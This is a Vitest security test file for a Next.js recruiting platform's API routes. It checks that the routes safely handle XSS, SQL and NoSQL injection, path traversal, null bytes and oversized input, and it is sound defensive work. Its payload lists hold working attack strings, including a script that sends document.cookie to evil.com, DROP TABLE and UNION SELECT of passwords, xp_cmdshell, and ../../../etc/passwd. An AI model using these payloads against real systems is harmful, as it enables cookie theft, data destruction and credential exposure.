import { describe, it, expect, vi, beforeEach } from "vitest";
import { NextRequest } from "next/server";

// ---------------------------------------------------------------------------
// Mocks
// ---------------------------------------------------------------------------
const mockGetAuthContext = vi.fn();
const mockFrom = vi.fn();
const mockInsert = vi.fn();
const mockSelect = vi.fn();

function createChainableBuilder() {
  const builder: Record<string, any> = {};
  const chainMethods = [
    "select",
    "insert",
    "update",
    "upsert",
    "delete",
    "eq",
    "neq",
    "gt",
    "gte",
    "lt",
    "lte",
    "in",
    "is",
    "or",
    "ilike",
    "overlaps",
    "order",
    "limit",
    "range",
  ];
  for (const method of chainMethods) {
    builder[method] = vi.fn().mockReturnValue(builder);
  }
  builder.single = vi.fn().mockResolvedValue({ data: null, error: null });
  builder.maybeSingle = vi.fn().mockResolvedValue({ data: null, error: null });
  builder.then = vi.fn((fn?: (v: unknown) => unknown) =>
    Promise.resolve({ data: [], error: null, count: 0 }).then(fn),
  );
  return builder;
}

const defaultBuilder = createChainableBuilder();

vi.mock("@/lib/api-helpers", () => ({
  getAuthContext: () => mockGetAuthContext(),
  requireAuth: (ctx: unknown) => ctx !== null,
  hasRole: (ctx: { role: string }, ...roles: string[]) => roles.includes(ctx.role),
  parseJsonBody: async (request: Request) => {
    try {
      const body = await request.json();
      return { body, errorResponse: null };
    } catch {
      return {
        body: null,
        errorResponse: new Response(JSON.stringify({ error: "Invalid JSON body" }), {
          status: 400,
          headers: { "Content-Type": "application/json" },
        }),
      };
    }
  },
  jsonError: (msg: string, status: number) =>
    new Response(JSON.stringify({ error: msg }), {
      status,
      headers: { "Content-Type": "application/json" },
    }),
  jsonSuccess: (data: unknown, status = 200) =>
    new Response(JSON.stringify(data), {
      status,
      headers: { "Content-Type": "application/json" },
    }),
  handleApiError: (err: unknown, _msg: string) =>
    new Response(JSON.stringify({ error: String(err) }), {
      status: 500,
      headers: { "Content-Type": "application/json" },
    }),
  handleZodError: (error: { issues: { message: string }[] }) =>
    new Response(
      JSON.stringify({
        error: error.issues.map((e: { message: string }) => e.message).join("; "),
      }),
      { status: 422, headers: { "Content-Type": "application/json" } },
    ),
  reportError: vi.fn(),
  apiLogContext: vi.fn(),
  getTenantScopedClient: vi.fn(),
}));

vi.mock("@/lib/supabase/server", () => ({
  createSupabaseServerClient: () =>
    Promise.resolve({
      from: (...args: unknown[]) => {
        mockFrom(...args);
        return defaultBuilder;
      },
      auth: {
        getUser: vi.fn().mockResolvedValue({ data: { user: null }, error: null }),
      },
    }),
}));

vi.mock("@/lib/supabase/admin", () => ({
  createSupabaseAdmin: () => ({
    from: (...args: unknown[]) => {
      mockFrom(...args);
      return defaultBuilder;
    },
  }),
}));

vi.mock("@/lib/observability/logger", () => ({
  logger: { info: vi.fn(), error: vi.fn(), warn: vi.fn(), debug: vi.fn() },
}));

vi.mock("@/lib/observability/report-error", () => ({ reportError: vi.fn() }));

vi.mock("@/lib/security/rate-limit", () => ({
  buildScopedRateLimitKey: ({ route, userId, organisationId, ip }: any) =>
    `${route}:${organisationId ?? userId ?? ip ?? "anon"}`,
  checkRateLimit: vi.fn().mockResolvedValue({ allowed: true, remaining: 10, resetAt: new Date() }),
}));

vi.mock("@/lib/security/csrf", () => ({
  validateOrigin: vi.fn().mockReturnValue(null),
}));

vi.mock("@/lib/redis/auth-profile-cache", () => ({
  getCachedAuthProfile: vi.fn().mockResolvedValue(null),
  setCachedAuthProfile: vi.fn(),
}));

vi.mock("@/lib/redis/job-cache", () => ({
  getCachedJobList: vi.fn().mockResolvedValue(null),
  setCachedJobList: vi.fn(),
  invalidateJobCache: vi.fn(),
}));

vi.mock("@/lib/observability/with-correlation", () => ({
  withCorrelation: (fn: Function) => fn,
}));

vi.mock("@/lib/observability/route-span", () => ({
  withRouteSpan: (_name: string, fn: Function) => fn(),
}));

vi.mock("@/lib/observability/correlation", () => ({
  getCorrelationId: vi.fn().mockReturnValue("test-correlation-id"),
}));

vi.mock("@/lib/jobs/queue", () => ({
  enqueue: vi.fn().mockResolvedValue({ id: "mock-job" }),
}));

vi.mock("@/lib/services/CandidateService", () => ({
  CandidateService: {
    listMasked: vi.fn().mockResolvedValue({ candidates: [], pagination: {} }),
    getByUserId: vi.fn().mockResolvedValue({ id: "cand-1", email: "test@test.com", name: "Test" }),
  },
}));

vi.mock("@/lib/services/JobService", () => ({
  JobService: {
    list: vi.fn().mockResolvedValue({ jobs: [], pagination: {} }),
    create: vi.fn().mockResolvedValue({ id: "job-1" }),
  },
}));

vi.mock("@/lib/services/ApplicationService", () => ({
  ApplicationService: {
    listForCandidate: vi.fn().mockResolvedValue({ applications: [], pagination: {} }),
    listForRecruiter: vi.fn().mockResolvedValue({ applications: [], pagination: {} }),
    create: vi.fn().mockResolvedValue({ id: "app-1" }),
  },
}));

vi.mock("@/lib/services/ProfileService", () => ({
  ProfileService: {
    get: vi.fn().mockResolvedValue({ profile: {} }),
    update: vi.fn().mockResolvedValue({}),
  },
}));

vi.mock("@/lib/repositories/CandidateRepository", () => ({
  getAccessibleCandidateIdsForOrgs: vi.fn().mockResolvedValue([]),
}));

vi.mock("@/lib/services/notifications", () => ({
  createNotification: vi.fn(),
}));

vi.mock("@/lib/services/resend", () => ({
  sendApplicationConfirmation: vi.fn().mockResolvedValue(undefined),
}));

vi.mock("@/lib/services/FitScoreService", () => ({
  FitScoreService: { computeSingle: vi.fn().mockResolvedValue(undefined) },
}));

// Use real Zod validation to ensure schema rejects malicious input
const { z } = await import("zod");

// ---------------------------------------------------------------------------
// Auth context fixtures
// ---------------------------------------------------------------------------
const recruiterCtx = {
  userId: "user-recruiter-1",
  role: "recruiter",
  organisationId: "org-1",
};

const candidateCtx = {
  userId: "user-candidate-1",
  role: "candidate_free",
  organisationId: null,
};

const adminCtx = {
  userId: "user-admin-1",
  role: "super_admin",
  organisationId: null,
};

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------
describe("Input Sanitization", () => {
  beforeEach(() => {
    mockGetAuthContext.mockReset();
    mockFrom.mockClear();
  });

  // =========================================================================
  // XSS Prevention
  // =========================================================================
  describe("XSS Prevention", () => {
    const xssPayloads = [
      '<script>alert("xss")</script>',
      '<img src=x onerror=alert("xss")>',
      '<svg/onload=alert("xss")>',
      "javascript:alert('xss')",
      '<iframe src="javascript:alert(1)">',
      '<body onload=alert("xss")>',
      '"><script>document.location="http://evil.com?c="+document.cookie</script>',
      '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=x onerror=alert(1)&gt;">',
      "{{constructor.constructor('return this')()}}", // Template injection
    ];

    it("search query with XSS payload does not execute (candidates)", async () => {
      mockGetAuthContext.mockResolvedValue(recruiterCtx);

      const module = await import("@/app/api/candidates/route");

      for (const payload of xssPayloads) {
        const req = new NextRequest(
          `http://localhost:3000/api/candidates?search=${encodeURIComponent(payload)}`,
        );
        const res = await module.GET(req);
        // The response should not contain unescaped script tags in JSON
        const text = await res.text();
        expect(text).not.toContain("<script>");
        // Should either succeed with safe data or return validation error
        expect([200, 422]).toContain(res.status);
      }
    });

    it("XSS in job search parameter is safely handled", async () => {
      mockGetAuthContext.mockResolvedValue(recruiterCtx);

      const { jobQuerySchema } = await import("@/lib/validations/jobs");

      for (const payload of xssPayloads) {
        // If the schema accepts the string, the database layer (parameterised
        // queries via Supabase) prevents actual injection. We verify the
        // payload does not appear unescaped in the response.
        const result = jobQuerySchema.safeParse({ search: payload });
        // Whether it passes or fails validation, no XSS should execute
        if (result.success) {
          // Parameterised queries prevent execution
          expect(result.data.search).toBe(payload); // stored as data, not executed
        }
      }
    });

    it("XSS in notification body is safely encoded in JSON", async () => {
      const payload = '<script>alert("xss")</script>';
      // JSON.stringify escapes internal quotes, making the payload a safe JSON string value.
      // The browser will not execute script tags when parsing JSON (Content-Type: application/json).
      const jsonEncoded = JSON.stringify({ body: payload });
      // Verify quotes inside the payload are escaped
      expect(jsonEncoded).toContain('\\"xss\\"');
      // The JSON string is safe for transmission — the Content-Type header
      // prevents browsers from interpreting it as HTML.
      const parsed = JSON.parse(jsonEncoded);
      expect(parsed.body).toBe(payload); // data integrity preserved
    });

    it("XSS in message body is handled safely", async () => {
      mockGetAuthContext.mockResolvedValue(recruiterCtx);

      const module = await import("@/app/api/messages/route");
      const req = new Request("http://localhost:3000/api/messages", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          participant_ids: ["user-2"],
          message: '<script>alert("xss")</script>',
        }),
      });
      const res = await module.POST(req as any);
      // Should process without executing XSS; stored as plain text
      // The response body in JSON will have escaped characters
      const text = await res.text();
      expect(text).not.toContain("<script>alert");
    });
  });

  // =========================================================================
  // SQL Injection Prevention
  // =========================================================================
  describe("SQL Injection Prevention", () => {
    const sqlPayloads = [
      "'; DROP TABLE candidates; --",
      "1 OR 1=1",
      "1; DELETE FROM profiles WHERE 1=1; --",
      "' UNION SELECT * FROM profiles --",
      "1'; EXEC xp_cmdshell('whoami'); --",
      "admin'--",
      "' OR '1'='1",
      "1) UNION ALL SELECT NULL,NULL,NULL,username,password FROM users--",
    ];

    it("SQL injection in search query is parameterised (candidates)", async () => {
      mockGetAuthContext.mockResolvedValue(recruiterCtx);

      const module = await import("@/app/api/candidates/route");

      for (const payload of sqlPayloads) {
        const req = new NextRequest(
          `http://localhost:3000/api/candidates?search=${encodeURIComponent(payload)}`,
        );
        const res = await module.GET(req);
        // Supabase uses parameterised queries; the payload is treated as data
        // Should not cause a 500 (which would indicate SQL error)
        expect(res.status).not.toBe(500);
      }
    });

    it("SQL injection in sort parameter is rejected or safely handled", async () => {
      mockGetAuthContext.mockResolvedValue(recruiterCtx);

      const module = await import("@/app/api/candidates/route");
      const req = new NextRequest(
        "http://localhost:3000/api/candidates?sort=name; DROP TABLE candidates;",
      );
      const res = await module.GET(req);
      // Should either reject invalid sort or ignore it
      expect(res.status).not.toBe(500);
    });

    it("UNION-based injection in notification limit is handled", async () => {
      mockGetAuthContext.mockResolvedValue(recruiterCtx);

      const module = await import("@/app/api/notifications/route");
      const req = new Request(
        "http://localhost:3000/api/notifications?limit=20 UNION SELECT * FROM profiles",
      );
      const res = await module.GET(req as any);
      // parseInt will return 20 (ignores trailing text) or NaN
      // Either way it should not cause SQL injection
      expect(res.status).not.toBe(500);
    });

    it("SQL injection in analytics metric parameter is handled", async () => {
      mockGetAuthContext.mockResolvedValue(adminCtx);

      const module = await import("@/app/api/analytics/route");
      const req = new Request(
        "http://localhost:3000/api/analytics?metric='; DROP TABLE analytics_time_to_hire; --",
      );
      const res = await module.GET(req as any);
      // Should fall through to default case in switch, not execute SQL
      expect(res.status).not.toBe(500);
    });

    it("SQL injection in page/offset parameters is safely parsed", async () => {
      mockGetAuthContext.mockResolvedValue(recruiterCtx);

      const module = await import("@/app/api/notifications/route");
      for (const payload of ["1; DROP TABLE notifications", "-1", "0", "99999999"]) {
        const req = new Request(
          `http://localhost:3000/api/notifications?offset=${encodeURIComponent(payload)}&limit=20`,
        );
        const res = await module.GET(req as any);
        expect(res.status).not.toBe(500);
      }
    });
  });

  // =========================================================================
  // NoSQL Injection Prevention
  // =========================================================================
  describe("NoSQL Injection Prevention", () => {
    it("handles $gt operator in JSON body (application create)", async () => {
      mockGetAuthContext.mockResolvedValue(candidateCtx);

      const module = await import("@/app/api/applications/route");
      const req = new Request("http://localhost:3000/api/applications", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          jobId: { $gt: "" }, // NoSQL injection attempt
          interest: "high",
        }),
      });
      const res = await module.POST(req as any);
      // Zod validation should reject non-string jobId
      expect([400, 403, 422]).toContain(res.status);
    });

    it("handles $ne operator in query parameters", async () => {
      mockGetAuthContext.mockResolvedValue(recruiterCtx);

      const module = await import("@/app/api/candidates/route");
      const req = new NextRequest("http://localhost:3000/api/candidates?role[$ne]=candidate");
      const res = await module.GET(req);
      // Supabase is SQL-based, NoSQL operators are treated as plain strings
      expect(res.status).not.toBe(500);
    });

    it("handles nested object injection in message body", async () => {
      mockGetAuthContext.mockResolvedValue(recruiterCtx);

      const module = await import("@/app/api/messages/route");
      const req = new Request("http://localhost:3000/api/messages", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          participant_ids: ["user-2"],
          message: { $gt: "" }, // NoSQL-style injection
        }),
      });
      const res = await module.POST(req as any);
      // Should reject because message must be a string
      expect([400, 422]).toContain(res.status);
    });
  });

  // =========================================================================
  // Path Traversal Prevention
  // =========================================================================
  describe("Path Traversal Prevention", () => {
    it("rejects ../../../etc/passwd in export type parameter", async () => {
      mockGetAuthContext.mockResolvedValue(recruiterCtx);

      const module = await import("@/app/api/export/route");
      const req = new NextRequest("http://localhost:3000/api/export?type=../../../etc/passwd");
      const res = await module.GET(req);
      // Should reject invalid export type
      expect(res.status).toBe(400);
      const body = await res.json();
      expect(body.error).toMatch(/Invalid export type/i);
    });

    it("rejects encoded path traversal in export type", async () => {
      mockGetAuthContext.mockResolvedValue(recruiterCtx);

      const module = await import("@/app/api/export/route");
      const req = new NextRequest(
        `http://localhost:3000/api/export?type=${encodeURIComponent("..%2F..%2Fetc%2Fpasswd")}`,
      );
      const res = await module.GET(req);
      expect(res.status).toBe(400);
    });

    it("rejects null byte injection in parameters", async () => {
      mockGetAuthContext.mockResolvedValue(recruiterCtx);

      const module = await import("@/app/api/export/route");
      const req = new NextRequest("http://localhost:3000/api/export?type=candidates%00.json");
      const res = await module.GET(req);
      expect(res.status).toBe(400);
    });
  });

  // =========================================================================
  // Oversized Input Prevention
  // =========================================================================
  describe("Oversized Input Prevention", () => {
    it("handles extremely long search string without crashing", async () => {
      mockGetAuthContext.mockResolvedValue(recruiterCtx);

      const module = await import("@/app/api/candidates/route");
      const longString = "A".repeat(100_000);
      const req = new NextRequest(`http://localhost:3000/api/candidates?search=${longString}`);
      const res = await module.GET(req);
      // Should not crash; either succeeds or returns validation error
      expect([200, 422]).toContain(res.status);
    });

    it("handles negative page/limit values", async () => {
      mockGetAuthContext.mockResolvedValue(recruiterCtx);

      const module = await import("@/app/api/notifications/route");
      const req = new Request("http://localhost:3000/api/notifications?limit=-1&offset=-100");
      const res = await module.GET(req as any);
      // Math.min and Math.max in the handler should sanitise these
      expect(res.status).not.toBe(500);
    });
  });

  // =========================================================================
  // Invalid JSON body handling
  // =========================================================================
  describe("Invalid JSON body handling", () => {
    it("returns 400 for malformed JSON in POST /api/jobs", async () => {
      mockGetAuthContext.mockResolvedValue(recruiterCtx);

      const module = await import("@/app/api/jobs/route");
      const req = new Request("http://localhost:3000/api/jobs", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: "{invalid json",
      });
      const res = await module.POST(req as any);
      expect(res.status).toBe(400);
    });

    it("returns 400 for malformed JSON in POST /api/messages", async () => {
      mockGetAuthContext.mockResolvedValue(recruiterCtx);

      const module = await import("@/app/api/messages/route");
      const req = new Request("http://localhost:3000/api/messages", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: "not-json-at-all",
      });
      const res = await module.POST(req as any);
      expect(res.status).toBe(400);
    });
  });
});
